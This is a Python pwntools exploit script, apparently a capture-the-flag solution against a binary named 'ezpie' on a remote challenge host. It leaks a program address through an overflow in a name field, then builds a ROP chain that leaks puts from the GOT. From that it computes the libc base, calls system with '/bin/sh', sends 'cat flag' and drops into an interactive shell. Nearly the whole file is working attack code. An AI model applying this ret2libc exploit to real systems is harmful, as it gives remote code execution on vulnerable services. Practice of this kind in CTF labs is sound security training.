# import time
from pwn import *

from LibcSearcher import *
# from ctypes import *
# from struct import pack
# from ae64 import AE64

# io = remote("192.168.170.128", 1234)
# io = remote("192.168.170.128", 9999)
io = remote("43.249.195.138", 21049)
# io = remote("8.130.35.16", 52003)
# io = remote("chall.pwnable.tw", 10100)
# io = remote("61.147.171.105",   51565)
# io = remote("node4.buuoj.cn", 29323)
# io = remote("112.6.51.212", 30791)

# io = process('./q2')
# gdb.attach(io)
# context(os='linux', arch = 'amd64', log_level = "debug")
# elf = ELF('./leakenv')
libc = ELF('./2.31-0ubuntu9_amd64/libc-2.31.so')#桌面上


# libc = ELF('./libc-2.31.so')

def s(a):
    io.send(a)


def sa(a, b):
    io.sendafter(a, b)


def sl(a):
    io.sendline(a)


def sal(a, b):
    io.sendlineafter(a, b)


def r(n):
    return (io.recv(n))


def ru(a):
    return io.recvuntil(a)


def rl():
    return io.recvline()


def sla(a, b):
    io.sendlineafter(a, b)


def debug():
    gdb.attach(io)
    pause()


def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))


def inter():
    return io.interactive()


def operater(optr, opnd1, opnd2):
    optr_str_list = ['×', '**', '+', '-', '÷', '%']
    if optr in optr_str_list:
        index = optr_str_list.index(optr)
    if optr == optr_str_list[0]:  # 乘法
        result = opnd1 * opnd2
    elif optr == optr_str_list[1]:  # 幂运算
        result = opnd1 ** opnd2
    elif optr == optr_str_list[2]:  # 加法
        result = opnd1 + opnd2
    elif optr == optr_str_list[3]:  # 减法
        result = opnd1 - opnd2
    elif optr == optr_str_list[4]:  # 除法
        if opnd2 != 0:  # 避免除以零错误
            result = opnd1 / opnd2
        else:
            result = "Error: Division by zero"
    elif optr == optr_str_list[5]:  # 取余
        if opnd2 != 0:  # 避免取余时除数为零
            result = opnd1 % opnd2
        else:
            result = "Error: Modulo by zero"
    else:
        result = "Error: Invalid operator"

    return result


# context(os='linux', arch='amd64')
context(os='linux', arch='amd64', log_level="debug")

ru(b'name')
io.send(b'a' * (0x8 * 3 - 4) + b'bbbb')
ru(b'bbbb')
start_addr = u64((rl()[:-1]).ljust(8, b'\x00'))
print(hex(start_addr))
pro_base = start_addr - 0x10C0

pop_rdi = 0x0000000000001333 + pro_base
ret = 0x000000000000101a + pro_base

elf = ELF('./ezpie')
puts_got = elf.got['puts'] + pro_base
puts_plt = elf.plt['puts'] + pro_base

payload = b'a' * 0x58 + p64(ret) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start_addr)
ru(b'information')
sl(payload)
ru(b'thank you')
print(rl())
# print(rl())
puts_addr = get_addr()
print(hex(puts_addr))
libc_base = puts_addr - libc.sym['puts']
print(hex(libc_base))
system = libc_base + libc.sym['system']
binsh = pro_base + 0x2008
ru(b'input your name->')
sl(b'flag')
payload1 = b'b' * 0x58 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system) * 2
ru(b'information')
s(payload1)
sl(b"cat flag")

inter()
